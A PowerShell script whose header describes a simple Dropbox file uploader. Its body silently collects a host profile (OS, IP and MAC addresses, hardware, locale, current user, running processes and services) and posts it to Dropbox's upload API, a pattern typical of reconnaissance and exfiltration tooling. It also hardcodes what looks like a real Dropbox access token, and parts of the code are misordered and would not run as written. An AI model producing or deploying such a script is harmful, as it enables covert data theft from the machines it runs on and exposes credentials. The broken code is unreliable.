<#
.SYNOPSIS
This is a PowerShell script to upload a file to Dropbox using their REST API.

.DESCRIPTION
This PowerShell script will upload   
 a file to Dropbox using their REST API with the parameters you provide.

.PARAMETER SourceFilePath
The path of the file to upload.

.PARAMETER TargetFilePath
The path of the file on Dropbox.

.ENV PARAMETER DropBoxAccessToken
The Dropbox access token.   

#>

$sourceFilePath = "$env:USERPROFILE\Downloads\output_filename.txt"
$targetFilePath = "/Scripts/output.txt" # Uploads to the "/Scripts" folder in your Dropbox

Param(
    [Parameter(Mandatory = $true)]
    [string]$SourceFilePath,
    [Parameter(Mandatory = $true)]
    [string]$TargetFilePath 
)

# Gather System Information
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsName, OsManufacturer, CsName | Out-File -FilePath $sourceFilePath
Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength >> $sourceFilePath
Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, Status >> $sourceFilePath
Get-WmiObject -Class Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors >> $sourceFilePath
Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum >> $sourceFilePath
Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, MediaType >> $sourceFilePath
Get-WinHomeLocation >> $sourceFilePath
Get-WinSystemLocale >> $sourceFilePath
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()) >> $sourceFilePath
$currentUser.Identity.Name >> $sourceFilePath
Get-Process >> $sourceFilePath
Get-Service >> $sourceFilePath


# Construct the Dropbox-API-Arg JSON
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'

# Retrieve the Dropbox access token from the environment variable
$authorization = "Bearer " + (Get-Item env:DropBoxAccessToken).Value

# Create the headers for the request
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg",   
 $arg)
$headers.Add("Content-Type", 'application/octet-stream')   


# Make the API call to upload the file
try {
    $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    Write-Host "File uploaded to Dropbox successfully!"
}
catch {
    Write-Error "Error uploading file to Dropbox: $($_.Exception.Message)"
}

# Dropbox Configuration 
$env:DropBoxAccessToken = "sl.B7u1ZplIi39ac68T5sH_qg6EH0qBa_atBBXpK0408D0cU98Rw7N5TvT3hLUgJBqMFuabqKugjD58cj4bJagxg_LOHxG1xkj7NTE5O32EXxsCEV-EMiMGoGKRq9CwR9Zd2eXNzx3eptwbpC4"
$dropboxFolderPath = "/Scripts"
